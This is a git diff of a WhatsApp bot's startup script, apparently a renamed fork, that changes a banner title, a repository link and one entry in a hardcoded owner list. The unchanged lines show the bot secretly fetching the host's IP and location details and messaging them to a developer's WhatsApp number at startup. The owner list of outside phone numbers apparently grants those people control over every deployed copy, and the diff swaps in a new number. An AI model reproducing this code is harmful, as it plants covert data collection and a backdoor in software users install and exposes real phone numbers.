@@ -44,7 +44,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("6281333782061@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6281333782061?text=Assalamualaikum"}}})
+       denz.sendMessage("6281333782061@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Megumin BOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6281333782061?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -70,7 +70,7 @@ exec(`cd /sdcard/download && play *mp3`)
    
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
-        ownerNumber = ["6281333782061@s.whatsapp.net","994403792696@s.whatsapp.net","6288221400832@s.whatsapp.net","6281259909513@s.whatsapp.net","6289512871985@s.whatsapp.net","447451215242@s.whatsapp.net","447441417460@s.whatsapp.net","380943043840@s.whatsapp.net","6289512871985@s.whatsapp.net","6287819948818@s.whatsapp.net","994406309372@s.whatsapp.net","48699527399@s.whatsapp.net","994405054360@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        ownerNumber = ["6281333782061@s.whatsapp.net","994403792696@s.whatsapp.net","48459065026@s.whatsapp.net","6281259909513@s.whatsapp.net","6289512871985@s.whatsapp.net","447451215242@s.whatsapp.net","447441417460@s.whatsapp.net","380943043840@s.whatsapp.net","6289512871985@s.whatsapp.net","6287819948818@s.whatsapp.net","994406309372@s.whatsapp.net","48699527399@s.whatsapp.net","994405054360@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
         dtod = "6281333782061@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
@@ -224,7 +224,7 @@ function doProgress()
 	{
 		setTimeout( function() { console.clear(),
 		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))})}, 200 ) ;
+			console.log(stdout), console.log(bgcolor('https://github.com/Tersakiti404-cyber/bitch-bot', 'cyan'))})}, 200 ) ;
 	}
 	else
 	{
